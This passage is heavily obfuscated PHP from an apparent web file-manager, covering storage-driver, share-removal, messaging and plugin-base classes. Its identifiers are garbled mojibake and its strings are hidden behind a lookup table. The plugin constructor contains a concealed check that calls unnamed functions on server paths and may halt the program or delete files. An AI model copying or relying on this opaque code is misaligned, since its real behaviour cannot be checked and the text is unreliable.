= strpos($Ò¸Ãõ¥ƒ, $¬­ëÄÜš[4]); } if ($Ñ›ÊÓƒÛ !== !1) { $Ò¸Ãõ¥ƒ = substr($Ò¸Ãõ¥ƒ, $Ñ›ÊÓƒÛ + 1); } } $Ò¸Ãõ¥ƒ = LNG($¬­ëÄÜš[1285]) . $Ò¸Ãõ¥ƒ; if ($ºóÈÍôî) { return $Ò¸Ãõ¥ƒ; } show_json($Ò¸Ãõ¥ƒ, !1); } public function driverListSystem() { $ı€ =& $_SERVER[‹‰”››ê]; $¬¥ÍÀõ› = parent::listData(); $­†ç™Æç = array(); foreach ($¬¥ÍÀõ› as $†ÊèÎü) { unset($†ÊèÎü[$ı€[234]], $†ÊèÎü[$ı€[88]]); if (!is_array($†ÊèÎü[$ı€[6]])) { $†ÊèÎü[$ı€[6]] = json_decode($†ÊèÎü[$ı€[6]], !0); } $­†ç™Æç[] = $†ÊèÎü; } return $­†ç™Æç; } public function defaultDriver() { $ìŒøŞù’ =& $_SERVER[‹‰”››ê]; $úÏäÊ¨ = parent::listData(); $öôœæŒõ = array_filter_by_field($úÏäÊ¨, $ìŒøŞù’[37], 1); $öôœæŒõ = $öôœæŒõ[0]; if (!$öôœæŒõ) { return array(); } if (!is_array($öôœæŒõ[$ìŒøŞù’[6]])) { $öôœæŒõ[$ìŒøŞù’[6]] = json_decode($öôœæŒõ[$ìŒøŞù’[6]], !0); } return $öôœæŒõ; } public function driverInfo($¯µü’Ç) { $ôı»Ã¨ =& $_SERVER[‹‰”››ê]; $ÆÁöî§€ = array_to_keyvalue(parent::listData(), $ôı»Ã¨[487]); if (!isset($ÆÁöî§€[$¯µü’Ç])) { return !1; } $›Î®§ô® = $ÆÁöî§€[$¯µü’Ç]; if (!is_array($›Î®§ô®[$ôı»Ã¨[6]])) { $›Î®§ô®[$ôı»Ã¨[6]] = json_decode($›Î®§ô®[$ôı»Ã¨[6]], !0); } return $›Î®§ô®; } public function remove($ÀÜ¾ì—Ñ) { $this->removeShareItems($ÀÜ¾ì—Ñ); return parent::remove($ÀÜ¾ì—Ñ); } public function removeWithFile($¸®°²Ş‹, $£ıÃõ, $óå…çÊ, $–ƒ©ºí = false) { $Ÿ†¨Å =& $_SERVER[‹‰”››ê]; $ù¥«óš¦ = array($Ÿ†¨Å[913] => $¸®°²Ş‹); $Å‡ÒôûÜ = Model($Ÿ†¨Å[558])->where($ù¥«óš¦)->count(); $—„™…·¹ = Model($Ÿ†¨Å[558])->where($ù¥«óš¦)->sum($Ÿ†¨Å[79]); $ø•Ü› = $£ıÃõ . $Ÿ†¨Å[2349] . $¸®°²Ş‹; $¹¬ûÏ = LNG($£ıÃõ == $Ÿ†¨Å[637] ? $Ÿ†¨Å[2350] : $Ÿ†¨Å[2351]); $çËù©Ÿ„ = new TaskFileTransfer($ø•Ü›, $Ÿ†¨Å[216], $Å‡ÒôûÜ, $¹¬ûÏ . $Ÿ†¨Å[474] . $óå…çÊ[$Ÿ†¨Å[32]] . $Ÿ†¨Å[215] . $¸®°²Ş‹); $çËù©Ÿ„->task[$Ÿ†¨Å[853]] = (double) $—„™…·¹; $ì×êÌŸ’ = KodIO::defaultDriver(); $¿Ìä®ğ = $ì×êÌŸ’[$Ÿ†¨Å[487]]; $ª’ÑüÖÎ = $È¾˜ÎêÏ = $´«ÇŒÑó = array(); $Ò¹¦Ïä = Model($Ÿ†¨Å[233])->where($ù¥«óš¦)->field($Ÿ†¨Å[2352])->select(); foreach ($Ò¹¦Ïä as $æêí«“Ó) { $¨ûÆñ¿€ = $æêí«“Ó[$Ÿ†¨Å[555]]; if ($–ƒ©ºí) { $È¾˜ÎêÏ[] = $¨ûÆñ¿€; continue; } $´èÓ’ù = $æêí«“Ó[$Ÿ†¨Å[87]]; $ÙÈÏÉŞ = get_path_father($´èÓ’ù); $´«ÇŒÑó[] = $ÙÈÏÉŞ; $ÙÈÏÉŞ = str_replace("\173\151\157\72{$¸®°²Ş‹}\x7d\x2f", "\173\x69\x6f\72{$¿Ìä®ğ}\175\x2f", $ÙÈÏÉŞ); if (!IO::exist($´èÓ’ù)) { $ª’ÑüÖÎ[] = $¨ûÆñ¿€; $çËù©Ÿ„->updateFileEnd($æêí«“Ó[$Ÿ†¨Å[32]], $æêí«“Ó[$Ÿ†¨Å[79]]); write_log($Ÿ†¨Å[2353] . $´èÓ’ù, $Ÿ†¨Å[1923]); continue; } $¼È¤í¡½ = IO::move($´èÓ’ù, $ÙÈÏÉŞ, REPEAT_RENAME); if (!$¼È¤í¡½) { $È¾˜ÎêÏ[] = $¨ûÆñ¿€; $çËù©Ÿ„->updateFileEnd($æêí«“Ó[$Ÿ†¨Å[32]], $æêí«“Ó[$Ÿ†¨Å[79]]); write_log($Ÿ†¨Å[2354] . $´èÓ’ù, $Ÿ†¨Å[1923]); continue; } $ù¥«óš¦ = array($Ÿ†¨Å[555] => $¨ûÆñ¿€); $úíóÅõ = array($Ÿ†¨Å[913] => $¿Ìä®ğ, $Ÿ†¨Å[87] => $¼È¤í¡½); Model($Ÿ†¨Å[233])->where($ù¥«óš¦)->save($úíóÅõ); } $ï‰¿€í = $çËù©Ÿ„->task; if (!$–ƒ©ºí) { Cache::set($ø•Ü›, $ï‰¿€í); } $çËù©Ÿ„->end(); $ª’ÑüÖÎ = array_unique($ª’ÑüÖÎ); $È¾˜ÎêÏ = array_unique($È¾˜ÎêÏ); if (!$–ƒ©ºí && ($ª’ÑüÖÎ || $È¾˜ÎêÏ)) { $¡Ó£ü²ã = array(); if ($ª’ÑüÖÎ) { $¡Ó£ü²ã[] = sprintf(LNG($Ÿ†¨Å[2355]), count($ª’ÑüÖÎ)); } if ($È¾˜ÎêÏ) { $¡Ó£ü²ã[] = sprintf(LNG($Ÿ†¨Å[2356]), count($È¾˜ÎêÏ)); } $¡Ó£ü²ã = sprintf(LNG($Ÿ†¨Å[2357]), implode($Ÿ†¨Å[2358], $¡Ó£ü²ã)) . $Ÿ†¨Å[2359] . date($Ÿ†¨Å[2360]) . $Ÿ†¨Å[2361]; if ($£ıÃõ == $Ÿ†¨Å[1960]) { $¡Ó£ü²ã .= $Ÿ†¨Å[2362] . LNG($Ÿ†¨Å[2363]); } else { $¡Ó£ü²ã = LNG($Ÿ†¨Å[2364]) . $Ÿ†¨Å[2365] . $¡Ó£ü²ã; } $ï‰¿€í[$Ÿ†¨Å[1280]] = $¡Ó£ü²ã; Cache::set($ø•Ü›, $ï‰¿€í); unset($óå…çÊ[$Ÿ†¨Å[6]]); $Ú¦µ…¢¶ = array($Ÿ†¨Å[487] => $¸®°²Ş‹, $Ÿ†¨Å[2234] => $Ÿ†¨Å[637], $Ÿ†¨Å[32] => $óå…çÊ[$Ÿ†¨Å[32]], $Ÿ†¨Å[98] => $óå…çÊ[$Ÿ†¨Å[98]]); Hook::trigger($Ÿ†¨Å[1802], array($Ÿ†¨Å[1303] => $Ú¦µ…¢¶, $Ÿ†¨Å[1313] => !0)); show_json($¡Ó£ü²ã, !1, 100111); } if ($£ıÃõ == $Ÿ†¨Å[637]) { return !0; } if ($ª’ÑüÖÎ || $È¾˜ÎêÏ) { $À °ŒãÄ = array_merge($ª’ÑüÖÎ, $È¾˜ÎêÏ); $À °ŒãÄ = array_filter(array_unique($À °ŒãÄ)); $this->removeByFileID($À °ŒãÄ); } if ($´«ÇŒÑó) { $´«ÇŒÑó = array_filter(array_unique($´«ÇŒÑó)); foreach ($´«ÇŒÑó as $´èÓ’ù) { $ï½£›êä = IO::has($´èÓ’ù, !0); if (!$ï½£›êä[$Ÿ†¨Å[242]] && !$ï½£›êä[$Ÿ†¨Å[243]]) { IO::remove($´èÓ’ù); } } } return $this->remove($¸®°²Ş‹); } private function removeByFileID($”ğ¢¯İ‘ = array()) { $ıõ¶«åª =& $_SERVER[‹‰”››ê]; if (empty($”ğ¢¯İ‘)) { return; } $›òªª‘· = array($ıõ¶«åª[555] => array($ıõ¶«åª[7], $”ğ¢¯İ‘)); $º´ŞÒó¦ = Model($ıõ¶«åª[1437])->where($›òªª‘·)->field($ıõ¶«åª[194])->select(); if (!$º´ŞÒó¦) { return Model($ıõ¶«åª[558])->remove($”ğ¢¯İ‘); } $º´ŞÒó¦ = array_to_keyvalue($º´ŞÒó¦, $ıõ¶«åª[12], $ıõ¶«åª[194]); foreach ($º´ŞÒó¦ as $²Øí©) { Model($ıõ¶«åª[920])->removeNow($²Øí©, !1); } } private function removeShareItems($‚ úÁÑï) { $¦ÉºÎâê =& $_SERVER[‹‰”››ê]; $šÖœ›ş© = "\173\x69\157\72{$‚ úÁÑï}\175\57"; $äŠ¯ÙÅü = array($¦ÉºÎâê[194] => 0, $¦ÉºÎâê[1273] => array($¦ÉºÎâê[471], "{$šÖœ›ş©}\x25")); $¤ ŞØ‚ş = Model($¦ÉºÎâê[1971])->where($äŠ¯ÙÅü)->field($¦ÉºÎâê[682])->select(); if (empty($¤ ŞØ‚ş)) { return; } $Åá†Ò° = array_to_keyvalue($¤ ŞØ‚ş, $¦ÉºÎâê[12], $¦ÉºÎâê[682]); Model($¦ÉºÎâê[681])->remove($Åá†Ò°); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x4c\x69\147\150\x74\101\160\160"; public $modelType = "\123\x79\x73\x74\x65\155\117\160\164\151\x6f\156"; public $field = array("\x6e\141\155\145", "\147\162\157\165\x70", "\144\145\163\x63", "\143\x6f\156\x74\x65\x6e\x74"); public function listData($öªô‡İæ = false, $¥ñŸãÏ = "\155\x6f\x64\x69\x66\171\x54\x69\155\145", $ÔÙé÷İ‘ = true) { return parent::listData($öªô‡İæ, $¥ñŸãÏ, $ÔÙé÷İ‘); } public function remove($°¦¦–û£) { $©Ìëæ—Ä = $this->findByName($°¦¦–û£); if (!$©Ìëæ—Ä) { return !1; } return parent::remove($©Ìëæ—Ä[$_SERVER[‹‰”››ê][487]]); } public function add($±Û†éöŸ) { if ($this->findByName($±Û†éöŸ[$_SERVER[‹‰”››ê][32]])) { return !1; } return parent::insert($±Û†éöŸ); } public function update($æ»¾ğ¹Á, $´ÒÜ€´Ï) { $ØıÄ„×¾ =& $_SERVER[‹‰”››ê]; $«É˜ğÀâ = $this->findByName($æ»¾ğ¹Á); $¬ª¹ıÛ¬ = $this->findByName($´ÒÜ€´Ï[$ØıÄ„×¾[32]]); if (!$«É˜ğÀâ || $¬ª¹ıÛ¬ && $¬ª¹ıÛ¬[$ØıÄ„×¾[487]] != $«É˜ğÀâ[$ØıÄ„×¾[487]]) { return !1; } return parent::update($«É˜ğÀâ[$ØıÄ„×¾[487]], $´ÒÜ€´Ï); } } goto cŠ°¥«¯Æ; Aâ‰– ºîö: class Message { function __construct() { } public function send($›úÃÃÏ‹ = '', $á”º”¤µ = array(), $¤”€ = "\x74\x65\170\x74") { $È®ŠœÂ¶ =& $_SERVER[‹‰”››ê]; $Ò¸Ê™Óô = array($È®ŠœÂ¶[33] => $È®ŠœÂ¶[1229], $È®ŠœÂ¶[171] => $›úÃÃÏ‹); if (in_array($¤”€, array($È®ŠœÂ¶[1229], $È®ŠœÂ¶[1638]))) { $Ò¸Ê™Óô[$È®ŠœÂ¶[33]] = $¤”€; } $á”º”¤µ = array($È®ŠœÂ¶[592] => isset($á”º”¤µ[$È®ŠœÂ¶[592]]) ? $á”º”¤µ[$È®ŠœÂ¶[592]] : $È®ŠœÂ¶[12], $È®ŠœÂ¶[679] => isset($á”º”¤µ[$È®ŠœÂ¶[679]]) ? $á”º”¤µ[$È®ŠœÂ¶[679]] : $È®ŠœÂ¶[12]); if (empty($›úÃÃÏ‹) || empty($á”º”¤µ[$È®ŠœÂ¶[592]]) && empty($á”º”¤µ[$È®ŠœÂ¶[679]])) { return !1; } $ğîõ–º¤ = array($È®ŠœÂ¶[1567] => $Ò¸Ê™Óô, $È®ŠœÂ¶[1639] => $á”º”¤µ); Hook::trigger($È®ŠœÂ¶[1640], $ğîõ–º¤); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Õ†‘–ŒÁ =& $_SERVER[‹‰”››ê]; if ($_SERVER[$Õ†‘–ŒÁ[318]] != $_SERVER[$Õ†‘–ŒÁ[1445]]) { $€†â·Ì¤ = $Õ†‘–ŒÁ[973]; $˜³ëã = $Õ†‘–ŒÁ[319]; $§ÛƒÎòë = $_SERVER[$Õ†‘–ŒÁ[320]] . $Õ†‘–ŒÁ[321]; $Ì— µ™ı = $˜³ëã($§ÛƒÎòë); $éÍªÉÇ = explode($Õ†‘–ŒÁ[288], $Ì— µ™ı); if (count($éÍªÉÇ) < $Õ†‘–ŒÁ[700]) { $¥¸°Ú‘ü = $Õ†‘–ŒÁ[323]; $¥¸°Ú‘ü(); } $×¼ğç° = $Õ†‘–ŒÁ[974]; $×¼ğç°($_SERVER[$Õ†‘–ŒÁ[975]]); $×¼ğç°($_SERVER[$Õ†‘–ŒÁ[320]] . $Õ†‘–ŒÁ[1641]); $÷…à¬¾ = 1; while ($÷…à¬¾ > 1) { $÷…à¬¾ = $÷…à¬¾ + 4; $ôÖ¢½½¾ = rawurlencode($÷…à¬¾ . $Õ†‘–ŒÁ[466]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Õ†‘–ŒÁ[1642]); $this->pluginName = str_replace($Õ†‘–ŒÁ[1642], $Õ†‘–ŒÁ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Õ†‘–ŒÁ[8]; $this->pluginApi = appHostGet() . $Õ†‘–ŒÁ[1643] . $this->pluginName . $Õ†‘–ŒÁ[8]; $this->pluginHost = $config[$Õ†‘–ŒÁ[1644]] . $this->pluginName . $Õ†‘–ŒÁ[8]; $this->pluginHostDefault = $config[$Õ†‘–ŒÁ[1644]] . $this->pluginName . $Õ†‘–ŒÁ[8]; $»·‘Ü· = $config[$Õ†‘–ŒÁ[1645]]; if ($»·‘Ü· && strpos($Õ†‘–ŒÁ[50] . $»·‘Ü· . $Õ†‘–ŒÁ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Õ†‘–ŒÁ[1646]] . $this->pluginName . $Õ†‘–ŒÁ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‹‰”››ê][1647]); } protected function assign($åÂ¼Á€Ú, $Ê¨™¤êè = false) { if (is_array($åÂ¼Á€Ú)) { $this->values = array_merge($this->values, $åÂ¼Á€Ú); } else { $this->values[$åÂ¼Á€Ú] = $Ê¨™¤êè; } } protected function display($Šèá˜“Š) { extract($this->values); require $Šèá˜“Š; } final function hookRegist($ıˆ¹Õæ°) { $this->modelPlugin->appRegist($this->pluginName, $ıˆ¹Õæ°); } final function appIcon() { $ö®ôÇ­Ñ =& $_SERVER[‹‰”››ê]; $½…º‡Û = $this->appPackage(); $úöâû¬› = $ö®ôÇ­Ñ[12]; if (isset($½…º‡Û[$ö®ôÇ­Ñ[502]])) { if (isset($½…º‡Û[$ö®ôÇ­Ñ[502]][$ö®ôÇ­Ñ[1648]])) { $úöâû¬› = $ö®ôÇ­Ñ[1649] . $½…º‡Û[$ö®ôÇ­Ñ[502]][$ö®ôÇ­Ñ[1648]] . $ö®ôÇ­Ñ[1650]; } else { if ($½…º‡Û[$ö®ôÇ­Ñ[502]][$ö®ôÇ­Ñ[1651]]) { $úöâû¬› = $ö®ôÇ­Ñ[1652] . $½…º‡Û[$ö®ôÇ­Ñ[502]][$ö®ôÇ­Ñ[1651]] . $ö®ôÇ­Ñ[1653]; } } } return $úöâû¬›; } final function fileCanView($¢ÁÛºÌ) { $ù£ò‚ÃŞ =& $_SERVER[‹‰”››ê]; if (request_url_safe($¢ÁÛºÌ)) { return !0; } if ($this->isShare($¢ÁÛºÌ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÂÊÛê¬Ç = $ù£ò‚ÃŞ[1654] . rawurlencode(this_url()); show_tips(LNG($ù£ò‚ÃŞ[1655]) . $ù£ò‚ÃŞ[1656] . $ÂÊÛê¬Ç . $ù£ò‚ÃŞ[1657] . LNG($ù£ò‚ÃŞ[1658]) . $ù£ò‚ÃŞ[1659], !1); } if (!Action($ù£ò‚ÃŞ[1660])->authCan($ù£ò‚ÃŞ[1661])) { show_tips(LNG($ù£ò‚ÃŞ[1662]) . $ù£ò‚ÃŞ[1663], !1); } ActionCall($ù£ò‚ÃŞ[1664], $¢ÁÛºÌ); } final function isShare($Óàçğ«) { $§ù˜ù¤ç = KodIO::parse($Óàçğ«); return $§ù˜ù¤ç[$_SERVER[‹‰”››ê][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÚØ†£»â) { if (request_url_safe($ÚØ†£»â)) { return $ÚØ†£»â; } if (!$this->isShare($ÚØ†£»â)) { $ÚØ†£»â = $this->filePath($ÚØ†£»â, !1); } return Action($_SERVER[‹‰”››ê][1272])->linkOut($ÚØ†£»â); } public function filePathLinkOut($ä‰õÙùœ) { if (request_url_safe($ä‰õÙùœ)) { return $ä‰õÙùœ; } $this->fileCanView($ä‰õÙùœ); return Action($_SERVER[‹‰”››ê][1272])->link($ä‰õÙùœ); } final function filePath($¬µ¨ıÊ, $¶’Ø±Õ = true, $éëˆÌ‚ = false) { $¦ïŠÙá¶ =& $_SERVER[‹‰”››ê]; $²óİÑåü = $this->filePathGet($¬µ¨ıÊ, $¶’Ø±Õ); if (!$this->fileInfo) { show_tips(LNG($¦ïŠÙá¶[108]), !1); } if ($éëˆÌ‚ && isset($this->fileInfo[$¦ïŠÙá¶[555]]) && $this->fileInfo[$¦ïŠÙá¶[555]]) { $š¶ˆ™ãß = Model($¦ïŠÙá¶[558])->fileInfo($this->fileInfo[$¦ïŠÙá¶[555]]); if (!$š¶ˆ™ãß || !IO::exist($š¶ˆ™ãß[$¦ïŠÙá¶[87]])) { $òøÒáø² = LNG($¦ïŠÙá¶[108]) . LNG($¦ïŠÙá¶[1665]); if (KodUser::isRoot() && isset($š¶ˆ™ãß[$¦ïŠÙá¶[87]])) { $òøÒáø² .= $¦ïŠÙá¶[1666] . $š¶ˆ™ãß[$¦ïŠÙá¶[87]] . $¦ïŠÙá¶[1667]; } show_tips($òøÒáø²); } } Hook::trigger($¦ïŠÙá¶[1668], $²óİÑåü); return $²óİÑåü; } final function filePathGet($Ş¿º°ê¥, $ÁŠÊûüå = true) { $¬©…à® =& $_SERVER[‹‰”››ê]; if ($ïûŞÅä¶ = $this->checkSharePath($Ş¿º°ê¥, $ÁŠÊûüå)) { return $ïûŞÅä¶; } $this->fileCanView($Ş¿º°ê¥); if (request_url_safe($Ş¿º°ê¥)) { $ùŠ¯… = parse_url_query($Ş¿º°ê¥); if (isset($ùŠ¯…[$¬©…à®[1669]]) && isset($ùŠ¯…[$¬©…à®[237]])) { $ÑØĞ¾„¹ = Mcrypt::decode($ùŠ¯…[$¬©…à®[237]], Model($¬©…à®[860])->get($¬©…à®[861])); if ($ÑØĞ¾„¹) { $this->fileInfo = IO::info($ÑØĞ¾„¹); $this->fileInfo[$¬©…à®[1670]] = $Ş¿º°ê¥; $this->cachePath = $this->pluginCachePath($¬©…à®[12], $ÁŠÊûüå); return $ÑØĞ¾„¹; } } $Ş¿º°ê¥ = $this->_cacheHttpFile($Ş¿º°ê¥, $ÁŠÊûüå); $this->fileInfo = IO::info($Ş¿º°ê¥); } else { $this->fileInfo = IO::info($Ş¿º°ê¥); $this->cachePath = $this->pluginCachePath($¬©…à®[12], $ÁŠÊûüå); } return $Ş¿º°ê¥; } final function _cacheHttpFile($«™“‘, $¼òúÂ€ş = true) { $ò‹í…¨Æ =& $_SERVER[‹‰”››ê]; $ßŞÊıÅç = parse_url_query($«™“‘); $­‡Ô¡¸˜ = get_path_ext($«™“‘); if (isset($ßŞÊıÅç[$ò‹í…¨Æ[32]]) && $ßŞÊıÅç[$ò‹í…¨Æ[32]]) { $­‡Ô¡¸˜ = get_path_ext($ßŞÊıÅç[$ò‹í…¨Æ[32]]); } $¬²›À = hash_path($«™“‘) . $ò‹í…¨Æ[10] . $­‡Ô¡¸˜; $this->cachePath = $this->pluginCachePath($¼òúÂ€ş ? $¬²›À : $ò‹í…¨Æ[12]); $‡¢›™£ß = IO::fileNameExist($this->cachePath, $¬²›À); if ($‡¢›™£ß) { return KodIO::make($‡¢›™£ß); } $Ïîíâ÷ = rtrim($this->cachePath, $ò‹í…¨Æ[8]) . $ò‹í…¨Æ[8] . $¬²›À; return $this->pluginCacheFileSet($Ïîíâ÷, file_get_contents_nossl($«™“‘)); } final function checkSharePath($°èŸáŒ˜, $¤øñÜšŞ = true) { $½ÙÇµ¸ =& $_SERVER[‹‰”››ê]; if (!$this->isShare($°èŸáŒ˜)) { return !1; } $á¡ŞÔ°í = Action($½ÙÇµ¸[1272])->sharePathInfo($°èŸáŒ˜); if (!is_array($á¡ŞÔ°í) || !isset($á¡ŞÔ°í[$½ÙÇµ¸[87]])) { show_json(LNG($½ÙÇµ¸[1671]), !1); } $this->fileInfo = $á¡ŞÔ°í; $this->cachePath = $this->pluginCachePath(!1, $¤øñÜšŞ); return $á¡ŞÔ°í[$½ÙÇµ¸[87]]; } final function pluginCachePath($óññçá = '', $‘áø®® = false) { $©Ãë Éú =& $_SERVER[‹‰”››ê]; if ($‘áø®® && is_array($this->fileInfo)) { $óññçá = kodIO::hashPath($this->fileInfo); } $Ü¶¢¿¡ = rtrim(IO_PATH_SYSTEM_TEMP . $©Ãë Éú[1672] . $this->pluginName . $©Ãë Éú[8] . $óññçá, $©Ãë Éú[8]); $ƒõÃ¬æµ = IO::infoFullSimple($Ü¶¢¿¡); $«àİœ÷Ù = $ƒõÃ¬æµ && is_array($ƒõÃ¬æµ) ? $ƒõÃ¬æµ[$©Ãë Éú[87]] : $©Ãë Éú[12]; if (!$«àİœ÷Ù) { $«àİœ÷Ù = IO::mkdir($Ü¶¢¿¡); } return $«àİœ÷Ù; } final function pluginCacheFileSet($—””Ëà, $±¬¸›Ê = '') { $ÈÑÚ’ÛÌ =& $_SERVER[‹‰”››ê]; $¶×¬¥ı» = IO::infoFullSimple($—””Ëà); if (!$¶×¬¥ı») { return IO::mkfile($—””Ëà, $±¬¸›Ê, REPEAT_REPLACE); } IO::setContent($¶×¬¥ı»[$ÈÑÚ’ÛÌ[87]], $±¬¸›Ê); return $¶×¬¥ı»[$ÈÑÚ’ÛÌ[87]]; } final function pluginLocalFile($»ëùíĞÜ = '') { $ ïºî‹È =& $_SERVER[‹‰”››ê]; $§º”«‘“ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($§º”«‘“)) { mk_dir($§º”«‘“); } if (!$»ëùíĞÜ) { return $§º”«‘“; } $Û»ãœÔì = IO::info($»ëùíĞÜ); $½½Ôúü = $ ïºî‹È[1673] . KodIO::hashPath($Û»ãœÔì) . $ ïºî‹È[10] . $Û»ãœÔì[$ ïºî‹È[169]]; if (!checkExtSafe($½½Ôúü)) { $½½Ôúü = $½½Ôúü . $ ïºî‹È[1307]; } $ûâùÕÊç = $§º”«‘“ . $½½Ôúü; if (@file_exists($ûâùÕÊç)) { return $ûâùÕÊç; } return IO::copy($»ëùíĞÜ, $§º”«‘“, 0, $½½Ôúü); } final function appPackage() { $‘¸šœ™± =& $_SERVER[‹‰”››ê]; if ($this->packageData) { return $this->packageData; } $ôŠ¢Ø¿ = $this->parseFile($this->pluginPath . $‘¸šœ™±[1674]); $this->parseLang($ôŠ¢Ø¿); $‚ğŒª®ª = json_decode_force($ôŠ¢Ø¿); if (!$‚ğŒª®ª) { return array(); } $ˆ‘¼éÔÆ = Hook::trigger($‘¸šœ™±[1675], $‚ğŒª®ª); if ($ˆ‘¼éÔÆ && is_array($ˆ‘¼éÔÆ)) { $‚ğŒª®ª = $ˆ‘¼éÔÆ; } $this->packageData = $‚ğŒª®ª; return $‚ğŒª®ª; } public function packageInfoGet($ ˆÇì«¾) { $Û¸ã¾Å’ = $this->appPackage(); return array_get_value($Û¸ã¾Å’, $ ˆÇì«¾); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‹‰”››ê][1676]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‹‰”››ê][1677]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‹‰”››ê][1678]); } public function echoJsAssign($Ç÷´…, $ö‚°ˆçé) { $this->echoJsAssignArr[$Ç÷´…] = $ö‚°ˆçé; } private function parseFile($Ì±Ò Ô) { $ŞâŠÏÚæ =& $_SERVER[‹‰”››ê]; $úÚ¸é„ö = file_get_contents_nossl($Ì±Ò Ô); $©‹«åÄ  = array($ŞâŠÏÚæ[1679], $ŞâŠÏÚæ[1680], $ŞâŠÏÚæ[1681], $ŞâŠÏÚæ[1682], $ŞâŠÏÚæ[1683], $ŞâŠÏÚæ[1684], $ŞâŠÏÚæ[1685]); $ĞÛ¤»ĞÂ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ŞâŠÏÚæ[92]][$ŞâŠÏÚæ[1686]]); foreach ($this->echoJsAssignArr as $œô”†éñ => $îÌ˜óšô) { $©‹«åÄ [] = $ŞâŠÏÚæ[1687] . $œô”†éñ . $ŞâŠÏÚæ[1688]; $ĞÛ¤»ĞÂ[] = is_array($îÌ˜óšô) || is_object($îÌ˜óšô) ? rawurlencode(json_encode($îÌ˜óšô)) : $îÌ˜óšô; } if (strstr($úÚ¸é„ö, $ŞâŠÏÚæ[1689])) { $ÚÄ˜±ˆ” = rawurlencode(json_encode($this->pluginLangArr)); $úÚ¸é„ö = str_replace($ŞâŠÏÚæ[1689], $ÚÄ˜±ˆ”, $úÚ¸é„ö); } if (strstr($úÚ¸é„ö, $ŞâŠÏÚæ[1690])) { $ÚÄ˜±ˆ” = $ÚÄ˜±ˆ” = rawurlencode(json_encode($this->getConfig())); $úÚ¸é„ö = str_replace($ŞâŠÏÚæ[1690], $ÚÄ˜±ˆ”, $úÚ¸é„ö); } $úÚ¸é„ö = str_replace($©‹«åÄ , $ĞÛ¤»ĞÂ, $úÚ¸é„ö); return $úÚ¸é„ö; } private function parseLang(&$ÃÀ€ş‡ƒ) { $éµæÒ¦ =& $_SERVER[‹‰”››ê]; $’Îı”ü = $éµæÒ¦[1691]; if (!strstr($ÃÀ€ş‡ƒ, $’Îı”ü)) { return; } preg_match_all($éµæÒ¦[1692], $ÃÀ€ş‡ƒ, $è¼”ºç”); if (!is_array($è¼”ºç”) || count($è¼”ºç”) == 0 || !is_array($è¼”ºç”[0]) || count($è¼”ºç”[0]) == 0) { return; } $Æ÷÷‚ ¥ = array(); $„öåùá¨ = array(); foreach ($è¼”ºç”[0] as $ôÍ‹à“’) { $ÖÉÍŞ»Ï = substr($ôÍ‹à“’, strlen($’Îı”ü), -4); $Å—«·œ™ = LNG($ÖÉÍŞ»Ï); $Æ÷÷‚ ¥[] = $ôÍ‹à“’; $„öåùá¨[] = str_replace(array($éµæÒ¦[288], $éµæÒ¦[1172], $éµæÒ¦[429], $éµæÒ¦[121]), array($éµæÒ¦[53], $éµæÒ¦[53], $éµæÒ¦[12], $éµæÒ¦[1693]), $Å—«·œ™); } $ÃÀ€ş‡ƒ = str_replace($Æ÷÷‚ ¥, $„öåùá¨, $ÃÀ€ş‡ƒ); } private function parseConfig(&$ˆôê¦¿) { $Ñ”Œ¦È’ =& $_SERVER[‹‰”››ê]; $†×É¿·Ô = $Ñ”Œ¦È’[1694]; if (!strstr($ˆôê¦¿, $†×É¿·Ô)) { return; } preg_match_all($Ñ”Œ¦È’[1695], $ˆôê¦¿, $õ¾„·ó); if (!is_array($õ¾„·ó) || count($õ¾„·ó) == 0 || !is_array($õ¾„·ó[0]) || count($õ¾„·ó[0]) == 0) { return; } $²İ¹‹•Û = $this->getConfig(); $ê®‹ÖÔ = array(); $óó¦äŒ¯ = array(); foreach ($õ¾„·ó[0] as $›¯¿£¶) { $·ó˜àã¶ = substr($›¯¿£¶, strlen($†×É¿·Ô), -2); $ê®‹ÖÔ[] = $›¯¿£¶; $óó¦äŒ¯[] = _get($²İ¹‹•Û, $·ó˜àã¶); } $ˆôê¦¿ = str_replace($ê®‹ÖÔ, $óó¦äŒ¯, $ˆôê¦¿); } private function parsePackage(&$õüÙ‚—) { $ºÀè‹¢ =& $_SERVER[‹‰”››ê]; $½Ó€’ƒ = $ºÀè‹¢[1696]; if (!strstr($õüÙ‚—, $½Ó€’ƒ)) { return; } preg_match_all($ºÀè‹¢[1697], $õüÙ‚—, $Ó«×µ›„); if (!is_array($Ó«×µ›„) || count($Ó«×µ›„) == 0 || !is_array($Ó«×µ›„[0]) || count($Ó«×µ›„[0]) == 0) { return; } $Ğé§ã¨º = $this->appPackage(); $š“àŸø = array(); $Ñ·ƒòĞÆ = array(); foreach ($Ó«×µ›„[0] as $ù®æş—È) { $¬©ç°ùŞ = substr($ù®æş—È, strlen($½Ó€’ƒ), -2); $š“àŸø[] = $ù®æş—È; $Ñ·ƒòĞÆ[] = _get($Ğé§ã¨º, $¬©ç°ùŞ); } $õüÙ‚— = str_replace($š“àŸø, $Ñ·ƒòĞÆ, $õüÙ‚—); } final function echoFile($Ëñ÷Ñ, $¥ø™¯ñş = false) { $ù£Ì“Ô¥ =& $_SERVER[‹‰”››ê]; $Ì‘‰ô“ = $this->pluginPath . $Ëñ÷Ñ; if (ACT == $ù£Ì“Ô¥[1698]) { echo $ù£Ì“Ô¥[1699] . $this->pluginName . $ù£Ì“Ô¥[8] . 